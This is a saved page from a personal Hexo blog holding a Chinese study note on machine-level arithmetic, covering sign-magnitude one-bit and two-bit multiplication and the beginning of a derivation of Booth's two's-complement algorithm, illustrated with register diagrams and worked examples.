<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/9/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/9/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/06/17/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/17/%E6%9C%BA%E5%99%A8%E7%BA%A7%E7%AE%97%E6%9C%AF%E8%BF%90%E7%AE%97%E7%9A%84%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">机器级算术运算的原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-06-17 12:20:00 / Modified: 12:24:34" itemprop="dateCreated datePublished" datetime="2022-06-17T12:20:00+08:00">2022-06-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="机器级算术运算的原理">机器级算术运算的原理</h1>
<p>落脚在加法,全加器,半加器,全加器级联,等最基础的知识</p>
<p>机器在算术的时候有很多行为和人不一样,但是权位的思想是相同的</p>
<p>人在算术的时候通过列竖式对其的方式,隐含着权位规则.</p>
<p><strong>机器将权位规则体现在,随着运算会有中间结果的位移</strong></p>
<p>理解了机器将中间结果移位的原因,也就理解了机器级算术运算的原理</p>
<p>计组第三章讲的机器机计算方法实际上和程序员距离比较远,ALU中已经封装好了各种计算方法,那为什么还要我们学这一部分呢?</p>
<p>我的感觉让我们是理解计算机底层实现中的状态机思想,</p>
<p>在推导适应机器的算法时,越发感觉出,有固定的状态的转移套路</p>
<p>而这种思想将对我们在开发状态机服务端的时候提供世界观上的支持</p>
<p>然而课本对于该部分的介绍基本止步于如何计算,并没有下到算法如何设计得到的,可以说是一大遗憾.</p>
<p>现在将我的设计和课本给出的设计思想其补上</p>
<h2 id="手算原码乘法">手算原码乘法</h2>
<p>这是万恶之源,通过一个例题观察人类对权位规则的应用</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617122401353.png"
alt="image-20220617122401353" />
<figcaption aria-hidden="true">image-20220617122401353</figcaption>
</figure>
<p>之前一直不知道怎么描述这个过程,只能是手写比划比划,直到看了CSAPP第二章位向量表示法,终于知道怎么描述这个过程了</p>
<p>只看小数点后面的部分,把<span
class="math inline">\(X,Y\)</span>表示成位向量,有 <span
class="math display">\[
X=[X_3X_2X_1X_0]=\sum_{i=0}^3[2^i\times X_i](X_i=0\ or\ 1)
\]</span></p>
<p><span class="math display">\[
Y=[Y_3Y_2Y_1Y_0]=\sum_{i=0}^3[2^i\times Y_i](Y_i=0\ or\ 1)
\]</span></p>
<p>那么手算的思想可以用下式表示: <span class="math display">\[
\begin{aligned}
ANS&amp;=X\times Y\\
&amp;=X\times\sum_{i=0}^3[2^i\times Y_i]\\
&amp;=\sum_{i=0}^3[ 2^i\times X\times Y_i]\\
&amp;=[X\times Y_0]+2[X\times Y_1]+4[X\times Y_2]+8[X\times Y_3]\\
&amp;=A_0+A_1+A_2+A_3\\
&amp;=E\\
&amp;=[E_3E_2E_1E_0]
\end{aligned}
\]</span> 其中 <span class="math display">\[
A_i=2^i\times [X\times Y_i],i\in[0,3]
\]</span></p>
<p><span class="math display">\[
E_j=\sum_{i=0}^3A_{ij}+低位进位\\
j\in[0,7]\
\]</span> <img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616210922544.png"
alt="image-20220616210922544" /></p>
<p>这里<span
class="math inline">\(E_i\)</span>的计算方法就是小学里算竖式的时候,老师常说的"落下来"</p>
<p>从图上我们可以更清晰地看出,被乘数分别和乘数的"个十百千位"相乘,按位对其之后落下来累加得到E</p>
<h2 id="原码一位乘法">原码一位乘法</h2>
<p>如果让机器原封不动重复刚才手算的过程</p>
<h3 id="替机器瞎操心">替机器瞎操心</h3>
<p>他需要维护一个二维数组,记录用X和Y的每一位相乘,分别得到的中间位向量<span
class="math inline">\(A_i\)</span></p>
<p>然后"落下来"求<span class="math inline">\(E\)</span></p>
<p>就这个二维数组就把机器难为住了</p>
<p>1.如果两个32位整数相乘,就需要32*32个方格的二维数组,ALU可是没有记忆功能的,寄存器也就稀松几个,记忆能力有限,显然32²个方格没处放.</p>
<p>2.机器怎么知道当前应该用X对齐Y的"个位"还是"十位"还是"百位"呢?用一个寄存器,记录Y已经被对齐过几位吗?</p>
<p>不需要,因为本次对齐的位一定是只比上一次对齐位高一位,只需要将被乘数左移一下.</p>
<p>然后根据本次Y的对齐位是1则<span class="math inline">\(Ai=X\times
权重\)</span>,比如图表中<span class="math inline">\(A_3\)</span></p>
<p>如果本次Y的对齐位为0则<span
class="math inline">\(A_i=0\)</span>,比如图表中<span
class="math inline">\(A_2\)</span></p>
<p>问题又来了,权重用谁来记住呢?再开一个寄存器,初始记录1,表示权重为<span
class="math inline">\(2^0\)</span>,随着被乘数<span
class="math inline">\(X\)</span>的左移,这个寄存器也要左移一下表示权重乘以2</p>
<p>如果继续研究如何让硬件实现,还能发现更多问题.<del>第一,机器算账,这钱怎么进了你自己的腰包</del></p>
<h3 id="滚动数组">滚动数组</h3>
<p>现在考虑一下,有必要维护这个二维数组吗?滚动数组行吗?</p>
<p>中间过程不使用二维数组,就维护一个位向量<span
class="math inline">\(A\)</span>,计算过程中A只有累加和右移两种行为.</p>
<p>乘数个位为1,则被乘数直接加到A的<strong>高四位</strong></p>
<blockquote>
<p>为啥是高四位呢?似乎有点违反直觉,因为A的高位表示的是高权重,但是现在用被乘数乘的是乘数的个位,权位最低才对啊.别忘了A要右移</p>
</blockquote>
<p>然后A右移一位,乘数右移一位</p>
<blockquote>
<p>这个过程干了一个啥事呢?</p>
<p>被乘数一直和乘数的"最低位"对齐,刚才最低位是"个位",现在经过右移,个位直接扬了,十位成了"最低位".被乘数时钟看乘数最低位脸色行事,当这个最低位是1的时候才把自己加到A上,加到A的最高四位上</p>
<p>A右移一位,则所有历史记录都降权2,</p>
<p>可想而知,当乘数的千位右移到最低位,这时候被乘数将自己加到了A的高四位上,此时计算结束.乘数的千位和被乘数的积
的权就最高,根本不需要降权</p>
<p>而乘数的个位和被乘数的积此时已经经历了4次降权,权重仅为<span
class="math inline">\(\frac{1}{2^4}=\frac{1}{16}\)</span></p>
<p>这正好满足我们的目的</p>
</blockquote>
<p>现在可以用机器实现了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616213145320.png"
alt="image-20220616213145320" />
<figcaption aria-hidden="true">image-20220616213145320</figcaption>
</figure>
<h4 id="硬件框图的意义">硬件框图的意义</h4>
<p>这个图怎么看呢?</p>
<p>D和A合起来作为"中间过程位向量",D就是高四位,A就是低四位</p>
<p>一开始的时候D=0,A=Y,这好像和我们刚才的分析不一样,我们分析的滚动数组思想中,Y是独立存在的,不会放在A中.</p>
<p>而实际上Y需要独立存在吗?考虑每次被乘数要么不加,要么加到高四位上,而Y一开始放在低四位,两者不会相互影响.</p>
<p>随着这个中间过程位向量不断右移,Y被一位一位移除了A,当Y恰好移出的时候计算恰好结束.</p>
<p><span
class="math inline">\(A_0\)</span>就是乘数的"最低位",随着乘数Y的不断右移,硬件A的最低位会以此存放Y的个十百千位,相当于将Y遍历了一遍</p>
<p>"被乘数看乘数最低位颜色决定加不加"这个事怎么实现的呢?</p>
<p>用一个B寄存器存放被加数X,X和0作为二选一选择器的数据段,<span
class="math inline">\(A_0\)</span>作为该二选一的地址端,当<span
class="math inline">\(A_0=1\)</span>则选通X,当<span
class="math inline">\(A_0=0\)</span>则选通0</p>
<p>选通的信号就进入了<span
class="math inline">\(\Sigma\)</span>多位加法器</p>
<p>左上角这个循环干了啥事呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616213859376.png"
alt="image-20220616213859376" />
<figcaption aria-hidden="true">image-20220616213859376</figcaption>
</figure>
<p>被加数总是加到中间过程位向量的高四位,这怎么实现?将旧的高四位作为加数和X相加就得到了新的高四位</p>
<p>这个半调子CF是干啥的呢?</p>
<p>CF是PSW程序状态字中的一位,用来记录是否有进位,啥时候会有进位呢?</p>
<p>比如头一次D=1111,右移变成0111,然后下一次又加了1111,显然0111+1111溢出了,但是顶多溢出一位,于是放到CF里,然后D右移的时候,再从CF里拿出来放到D里</p>
<h3 id="手写模拟">手写模拟</h3>
<p>模拟机器计算<span class="math inline">\(0.1101\times
1.1011\)</span>(都是原码)</p>
<p>符号显然同号得负数,这对机器来说也是小菜一碟,两符号娶个异或即可</p>
<p>去掉小数点,后面的直接作为整数乘法,怎么乘的呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616215950459.png"
alt="image-20220616215950459" />
<figcaption aria-hidden="true">image-20220616215950459</figcaption>
</figure>
<p>最左侧这里列也是有实际意义的,里面是CF位的状态.</p>
<p>这一点课本并没有给出,这导致我一开始认为只有手算模拟才会用到这一列</p>
<p>乘数有四位,因此共有四次操作,恰好将Y从A中扬了,中间结果积逐渐充斥整个D和A</p>
<blockquote>
<p>这个过程要是找个现实中的类比的话,可以举这么一个不恰当的例子:</p>
<p>一个公司有10个部长,资本家的总是嫌这十个人好吃懒惰不干活,或者说即使比较勤奋,但是不想再给他发太多工资,直接降薪吧人家也不愿意.反正就是想找个理由踢了这是个人换成新人</p>
<p>但是资本家还不敢一口气全体了,这会造成一段时间没人管事儿.</p>
<p>于是资本家想了一个温水煮癞蛤蟆的方法,每隔一个月从这10个人里找一个业绩最差的,</p>
<p>要是他真的好吃懒惰啥也不干,直接踢了,公司正常运转.</p>
<p>要是他确实负责一些事情,那么找一个能干的新人把他挤了,公司正常运转</p>
<p>10个月后,10个部长就全是优秀并且高效的00后了</p>
</blockquote>
<h4 id="无符号右移">无符号右移?</h4>
<p>关于"无符号右移",这个事情发生在</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616220805565.png"
alt="image-20220616220805565" />
<figcaption aria-hidden="true">image-20220616220805565</figcaption>
</figure>
<table>
<thead>
<tr>
<th>原数</th>
<th>带符号右移结果</th>
<th>无符号右移结果</th>
</tr>
</thead>
<tbody>
<tr>
<td><span class="math inline">\(1&#39;0011&#39;1101\)</span></td>
<td><span class="math inline">\(1&#39;1001&#39;1110\)</span></td>
<td><span class="math inline">\(0&#39;1001&#39;1110\)</span></td>
</tr>
</tbody>
</table>
<p>显然正确的计算方法是无符号右移,为啥不是带符号的呢?</p>
<p>首先,带符号意味着负数,而我们整个计算过程中要么加0,要么加x,反正不会加一个负数,理论上就不存在加负数的情况</p>
<p>再者,这里最左侧的"符号"实际上是CF位,是上一次加被乘数之后的进位,不是"符号",我们一直在进行无符号运算</p>
<h2 id="原码两位乘法">原码两位乘法</h2>
<h3 id="为啥要两位乘">为啥要两位乘?</h3>
<p>原码两位乘法和原码一位乘法的思想基本相同,但是设计硬件的那伙子人嫌一位乘法太慢,这就好比一个人上楼梯,每次上一个台阶嫌慢,非得上两个</p>
<p>为啥没有原码三位乘法?<del>一次上三个台阶这不扯蛋吗</del></p>
<p>因为计算机中的数据都占用偶数位,从来没有说有一个66位计算机,有一个63位计算机,有一个30位计算机.</p>
<p>实际存在的计算机都是64位,32位,这些位数都是2的幂次,为啥非要是2的幂次?方便使用二进制呗.为啥一定使用二进制?逻辑门高电位和低电位就两种状态呗</p>
<p>为啥没有原码四位乘法?32和64不也是4的倍数吗?</p>
<p>还要考虑一个复杂性问题</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616230513076.png"
alt="image-20220616230513076" />
<figcaption aria-hidden="true">image-20220616230513076</figcaption>
</figure>
<p>如图原码二位乘已经有<span
class="math inline">\(2^3=8\)</span>种情况了,要是原码四位乘,不考虑低位进位的情况至少这四位需要考虑,就已经有<span
class="math inline">\(2^4=16\)</span>种情况了,显然让ALU考虑多种情况也是需要记忆功能的</p>
<p>在记忆能力和速度都可以接收的范围内,只有原码一位乘和原码二位乘是可行的</p>
<h3 id="规则">规则</h3>
<p>两位乘怎么玩呢?</p>
<p>原来被乘数看乘数最低位的脸色行事,现在被乘数还要看次低位的脸色.真的太卑微了</p>
<p>最低位和次低位的权还不一样,次低位更狠,权更重.</p>
<p>为了更详细的描述这个意思,规定X和Y的位向量表示</p>
<p>X和Y都忽略小数点和符号位,小数点后面的直接作为一个整数</p>
<p><span class="math inline">\(X=X_3X_2X_1X_0\)</span></p>
<p><span class="math inline">\(Y=Y_3Y_2Y_1Y_0\)</span></p>
<p>现在最低位就是<span
class="math inline">\(Y_0\)</span>,次低位就是<span
class="math inline">\(Y_1\)</span>,随着Y不断右移,这两个位会遍历整个Y</p>
<p>当<span
class="math inline">\(Y_1Y_0=11=3(Dec)\)</span>需要向中间过程位向量上加三个被乘数X,</p>
<p>当<span
class="math inline">\(Y_1Y_0=10=2(Dec)\)</span>需要向中间过程位向量上加两个被乘数X</p>
<p>当<span
class="math inline">\(Y_1Y_0=01=1(Dec)\)</span>需要向中间过程位向量上加一个被乘数X</p>
<p>当<span class="math inline">\(Y_1Y_0=00=0(Dec)\)</span>啥也不加</p>
<p>啥也不加,加一个X都好说,加两个X通过将X左移一位×2也容易实现,但是这个半吊子3怎么办呢?</p>
<p><code>3=4-1</code>,啥意思呢?</p>
<p>先从中间过程位向量的高四位减去一个被乘数X,</p>
<p>然后右移两位,这导致刚才减去的X降权4(右移两位相当于除以4),</p>
<p>此时再向高四位加上一个被乘数X,这个刚加上的X的权就高,是刚才减去的X的四倍,</p>
<p>这样一减一加,相当于在上一步(刚才减一的那一步)往中间过程位向量上加上了3个X.</p>
<p>达到了我们的目的</p>
<p>当<span
class="math inline">\(Y_1Y_0=11\)</span>,这时候才会加3X,还有加2X,1X,0的时候,怎么区分多种状态呢?用一个flag开关</p>
<p>也就是下表中的C</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616231945745.png"
alt="image-20220616231945745" />
<figcaption aria-hidden="true">image-20220616231945745</figcaption>
</figure>
<p>这个表什么意思呢?</p>
<h4 id="我一开始的理解">我一开始的理解</h4>
<p><strong>(当然是错误的,但是有借鉴意义)</strong></p>
<p>刚才我们推导怎么实现加3X的时候,先减X,位移后再加上X,看上去顺理成章,确实解决了上一回合需要加3X这个问题,</p>
<p>但是同时引入了新问题,即</p>
<p><strong>位移后的本回合有本回合要做的事情,而你却在本回合处理了上回合要做的事情,那么本回合本来要做的事情啥时候做呢?</strong></p>
<blockquote>
<p>啥叫本回合应该做的事?</p>
<p>每个回合要做的事就是根据<strong>当前</strong>乘数最低两位的脸色决定往中间过程位向量上加几个X</p>
</blockquote>
<p>要么本回合开一个额外回合,在给上回合擦腚之后,先不忙着将乘数右移开启下一个回合,而是正式处理本回合的事.处理完了再右移开启下一回合</p>
<p>但是这样怎么让一个傻子CPU知道这一次有没有额外回合呢?</p>
<p>可以用标志位C.每个正式回合都根据乘数最低两位是否全1,设置C是否为1,</p>
<p>当回合开始的时候,让CPU先检查C开关是否打开,</p>
<p>​ 如果开着则先擦腚,然后C给他关上,</p>
<p>​
如果C关着(不管是本来就管着还是擦完腚关上的,一视同仁),则处理本回合事物</p>
<p>我确实一开始是这样想的,但是仔细观察法则表之后发现人家的想法和我不一样</p>
<h4 id="人家的想法"><strong>人家的想法</strong></h4>
<p>如果按照我的设想,当C为1的时候,不需要看<span
class="math inline">\(Y_1Y_0\)</span>的脸色,直接加X,然后C置零</p>
<p><strong>然而</strong>表中即使C为1也需要看<span
class="math inline">\(Y_{i+1}Y_{i}\)</span>的脸色</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233254740.png"
alt="image-20220616233254740" />
<figcaption aria-hidden="true">image-20220616233254740</figcaption>
</figure>
<p>那么人家的方法什么思想呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233344339.png"
alt="image-20220616233344339" />
<figcaption aria-hidden="true">image-20220616233344339</figcaption>
</figure>
<p>这段文字十分滴珍贵,但是是那种懂的人一看就懂,不懂的看了还是不懂(此名言出自计组老师gx)</p>
<p>啥意思呢?不妨从研究这个表的结构规则入手</p>
<p>可以发现,</p>
<p>1.当<span class="math inline">\(Y_{i+1}\)</span>固定时,<span
class="math inline">\(Y_i\)</span>和<span
class="math inline">\(C\)</span>具有对称结构,具体表现为:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233605441.png"
alt="image-20220616233605441" />
<figcaption aria-hidden="true">image-20220616233605441</figcaption>
</figure>
<p>2.<span class="math inline">\(Y_i\)</span>和<span
class="math inline">\(C\)</span>联手的时候相当于<span
class="math inline">\(Y_{i+1}\)</span> <img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233706177.png"
alt="image-20220616233706177" /></p>
<p>也就是说,<span class="math inline">\(Y_i\)</span>和<span
class="math inline">\(C\)</span>就有完全相同的地位,<span
class="math inline">\(Y_{i+1}\)</span>权为2, <span
class="math inline">\(Y_i\)</span>权为1,<span
class="math inline">\(C\)</span>的权也是1</p>
<p>而这种类似的结构我们在什么地方见过呢?全加器</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/v2-9b6f89175b854c4c335a704982d3520f_r.jpg"
alt="一位全加器真值表" />
<figcaption aria-hidden="true">一位全加器真值表</figcaption>
</figure>
<p>全加器中<span
class="math inline">\(X,Y,C_{i-1}\)</span>三者具有轮换对称结构</p>
<p>而<span
class="math inline">\(C_{i-1}\)</span>表示的是低位向本位的进位开关,类比到原码两位乘法中,他就是低位计算时没擦干净的屁股</p>
<p>在这个全加器运算的时候,会同时考虑三路输入,将<span
class="math inline">\(X_i,Y_i,C_{i-1}\)</span>同时加起来,也就是在完成本回合的事物时,同时把上回合的屁股擦了</p>
<p>但是也可以设计成,<span
class="math inline">\(X_i+Y_i\)</span>先算好,然后将上回合的屁股<span
class="math inline">\(C_{i-1}\)</span>加上</p>
<p>设计固然可以这样设计,但是何必呢?算好的结果还需要保存一下然后才和<span
class="math inline">\(C_{i-1}\)</span>相加.</p>
<p>直接三个加起来不用保存中间结果并且更容易实现,岂不美哉</p>
</blockquote>
<p>就用全加器的思想考虑在原码两位乘法</p>
<p>C不也是低位向本位的进位吗?或者说,上一个回合留到本回合才能擦干净的屁股</p>
<p>在上个回合加4X,不就相当于在本回合加X吗?</p>
<p>处理上回合的屁股顶多在本回合加一个X,</p>
<p>要是本回合本来啥也不干,那么处理屁股,加上X就完了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235501743.png"
alt="image-20220616235501743" />
<figcaption aria-hidden="true">image-20220616235501743</figcaption>
</figure>
<p>要是本回合本来就应该加X,那么一块处理了,加上2X就完了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235511820.png"
alt="image-20220616235511820" />
<figcaption aria-hidden="true">image-20220616235511820</figcaption>
</figure>
<p>要是本回合本来应该加2X,加上屁股一个X,一共3X,只需要减一个X然后继续把屁股交给下一个回合</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235623070.png"
alt="image-20220616235623070" />
<figcaption aria-hidden="true">image-20220616235623070</figcaption>
</figure>
<p>要是本回合本来应该加3X,加上屁股一共四个X,可以加上左移两次的X,但是留一个屁股给下一回合加上也是相当于本回合加4X,还不用位移,岂不美哉</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235634096.png"
alt="image-20220616235634096" />
<figcaption aria-hidden="true">image-20220616235634096</figcaption>
</figure>
<p>如果上个回合没有留屁股(即C=0),则本回合只需要看<span
class="math inline">\(Y_1Y_0\)</span>脸色行事,不用擦屁股</p>
<p>如此这个法则表就不用死记硬背了</p>
<h4 id="手写模拟-1">手写模拟</h4>
<p><span
class="math inline">\(X=+0.100111,Y=-0.100111\)</span>用原码两位乘法求积</p>
<p>符号显然为1</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235859593.png"
alt="image-20220616235859593" />
<figcaption aria-hidden="true">image-20220616235859593</figcaption>
</figure>
<p>这个"符号位"是啥呢?</p>
<p>这确实是符号位,因为过程中有<span
class="math inline">\(-X\)</span>的行为.为啥要三个符号位呢?这个是人为规定的</p>
<p>因为两位乘每回合需要右移两位,那么符号位至少有两位,至于为什么是三位呢?</p>
<p>因为<strong>存在带符号右移</strong>的行为,右移两位之后符号位高两位是填充0呢还是填充1呢?</p>
<p>能不能全都填充0呢?诚如是则三个符号位都是摆设,编课本的人也不用编了.多此一举何必呢?</p>
<p>这符号位的最高位起一个提示的作用,如果最高位为1则右移的时候最高位也补1,否则补0</p>
<p>因此最高位完全是个人爱好添加的,因为只要是最高位是1,则符号位的第二位也是1,完全可以根据第二位的提示填充符号位的高两位</p>
<p>这里就有问题了,为什么会有带符号右移?原码一位乘法的时候明明没有带符号右移啊?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617000021929.png"
alt="image-20220617000021929" />
<figcaption aria-hidden="true">image-20220617000021929</figcaption>
</figure>
<p>因为过程中确实有<span
class="math inline">\(-X\)</span>这种行为,通过加补实现,而补码的符号位就是负数.</p>
<p>如果无符号右移,则本回合<span
class="math inline">\(-X\)</span>在右移后进入下回合时,符号位也跟着移到右侧,这个<span
class="math inline">\(-X\)</span>成了加一个数,失去减法的意义并且导致错误</p>
<h2 id="补码一位乘法--布斯法">补码一位乘法--布斯法</h2>
<h3 id="推导算法原理">推导算法原理</h3>
<p>令<span
class="math inline">\(X=X_0.X_{-1}X_{-2}...X_{-(n-1)}\)</span>,<span
class="math inline">\(Y=Y_0.Y_{-1}Y_{-2}...Y_{-(n-1)}\)</span></p>
<p>将<span class="math inline">\(Y\)</span>按照权位展开 <span
class="math display">\[
\begin{aligned}
Y&amp;=Y_0.Y_{-1}Y_{-2}...Y_{-(n-1)}\\
&amp;=Y_0\times 2^0+Y_{-1}\times 2^{-1}+Y_{-2}\times
2^{-2}+...+Y_{-(n-1)}\times 2^{-(n-1)}\\
&amp;=Y_0(2^1-2^0)+Y_{-1}\times(2^0-2^{-1})+Y_{-2}\times
(2^{-1}-2^{-2})+...+Y_{-(n-1)}\times (2^{-(n-2)}-2^{-(n-1)})\\
&amp;=2Y_0+2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+...+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(0-Y_{-(n-1)})
\end{aligned}
\]</span> 其中<span class="math inline">\(Y_0\)</span>是符号位,当<span
class="math inline">\(Y_0=0\)</span>,<span
class="math inline">\(2Y_0=0\)</span>,可以忽略</p>
<p>当<span class="math inline">\(Y_1=1\)</span>,<span
class="math inline">\(2Y_1=10\)</span>进位不管,本位还是<span
class="math inline">\(0\)</span>,也可以忽略</p>
<p>那么<span
class="math inline">\(Y=2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+...+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(0-Y_{-(n-1)})\)</span></p>
